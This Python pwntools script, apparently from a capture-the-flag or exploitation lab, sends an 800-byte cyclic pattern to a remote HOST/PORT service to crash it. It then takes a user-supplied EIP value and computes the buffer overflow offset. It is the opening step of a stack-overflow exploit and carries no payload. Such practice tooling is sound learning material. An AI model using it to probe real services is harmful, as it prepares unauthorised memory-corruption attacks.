#!/usr/bin/env python3
#coding: utf-8

from pwn import *
from constants import *
from typing import Literal

def find_offset() -> Literal:
    def send_cyclic(g: cyclic_gen, conn: remote):
        size_str = 800 # this nb must be > sizz of buffer
        p = g.get(size_str)
        conn.send(p)

    def get_offset(g: cyclic_gen):
        eip_value = input("EIP value: ")
        eip_value = int(eip_value, base=16)
        offset = g.find(eip_value)
        print(f"l'offset se situe au {offset[0]} octets")
        return offset
    g = cyclic_gen()
    conn = remote(HOST,PORT)
    conn.recvline()
    send_cyclic(g, conn)
    offset = get_offset(g)
    conn.close()
    return offset[0]

def main():
    find_offset()

if __name__ == '__main__':
    main()